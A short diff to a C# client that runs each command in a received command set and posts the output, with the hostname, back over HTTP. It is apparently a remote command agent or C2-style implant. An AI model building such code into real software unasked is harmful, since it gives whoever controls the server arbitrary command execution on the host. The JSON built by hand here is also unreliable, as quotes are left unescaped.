@@ -126,6 +126,7 @@ namespace client
                 // execute commands
                 
                 // don't pass another shell to this command shell!!!
+                //string responseBody = "lalal";
                 foreach (string command in commandSet.commands) {
                     Console.WriteLine($"Executing command: {command}");
                     // execute command
@@ -139,12 +140,14 @@ namespace client
                     {
                         using (StreamReader reader = process.StandardOutput)
                         {
-                            string result = reader.ReadToEnd();
+                            string result = await reader.ReadToEndAsync();
+                            //strip special characters as to not mess with the HTTP request
+                            result = result.Replace("\n", "").Replace("\r", "").Replace("\\", "\\\\");
                             string responseBody = $"{{\"hostname\": \"{hostname}\",\"response\": \"{result}\"}}";
+                            
+                            Console.WriteLine(responseBody);
                             (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
 
-                            Console.WriteLine(result);
-                            
                         }
                     }
                 }
